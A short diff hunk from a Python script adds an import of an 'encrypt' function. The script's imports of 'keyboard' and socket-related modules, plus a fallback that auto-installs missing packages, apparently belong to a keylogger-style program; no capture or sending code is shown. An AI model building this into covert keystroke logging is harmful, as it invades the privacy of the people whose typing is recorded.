@@ -8,6 +8,7 @@ try:
     import time
     import keyboard
     from threading import Thread
+    from encrypt_and_decrypt import encrypt
 except ModuleNotFoundError:
     from subprocess import call
     modules = ["socket", "keyboard"]
